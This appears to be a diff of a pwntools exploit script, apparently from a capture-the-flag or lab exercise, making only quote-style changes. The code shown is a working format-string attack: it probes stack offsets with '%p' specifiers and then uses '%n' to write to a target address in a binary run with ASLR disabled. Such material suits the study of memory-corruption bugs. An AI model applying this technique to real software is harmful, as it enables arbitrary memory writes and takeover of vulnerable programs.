@@ -14,18 +14,18 @@ offset = None
 count = None
 for i in range(1, 200):
     for j in range(0, 4):
-        payload = b''
+        payload = b""
         payload += j * b"."
         payload += b"AAAA"
         payload += f"%{i}$p".encode()
-        payload += (128 - len(payload)) * b' '
+        payload += (128 - len(payload)) * b" "
         assert len(payload) == 128
 
         try:
             p = process(["", payload], env={}, executable=gen_filename, aslr=False)
             result = p.read()
             print(i, result)
-            if b'0x41414141' in result:
+            if b"0x41414141" in result:
                 offset = i
                 count = j
                 break
@@ -38,13 +38,12 @@ for i in range(1, 200):
 
 log.info(f"offset is {offset}")
 
-payload = b''
+payload = b""
 payload += count * b"."
 payload += p32(target)
 payload += f"%{offset}$n".encode()
-payload += (128 - len(payload)) * b' '
+payload += (128 - len(payload)) * b" "
 assert len(payload) == 128
 
 p = process(["", payload], env={}, executable=gen_filename, aslr=False)
 p.stream()
-
